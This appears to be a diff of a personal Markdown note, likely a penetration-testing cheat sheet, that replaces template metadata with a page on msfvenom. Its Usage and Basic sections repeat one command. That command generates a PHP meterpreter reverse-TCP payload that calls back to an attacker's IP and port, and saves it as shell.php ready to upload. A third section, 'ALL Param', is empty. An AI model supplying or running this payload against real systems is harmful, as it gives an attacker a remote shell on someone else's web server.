@@ -1,12 +1,23 @@
 ---
-up: [[999 工具地圖]]
+
 ---
-# Metadata
-Status:: 123
+## Metadata
+up:: [[Toolmap]]
 
-Basic Field:: Value
-**Bold Field**:: Nice!
-You can also write [field:: inline fields]; multiple [field2:: on the same line].
-If you want to hide the (field3:: key), you can do that too.
-
+---
+## Info
+```ad-info
+title: =
+```
+---
+## Usage
+```bash
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\n'> shell.php && pbpaste >> shell.php
+```
+## Note
+### Basic
+```bash
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\n'> shell.php && pbpaste >> shell.php
+```
+### ALL Param
 
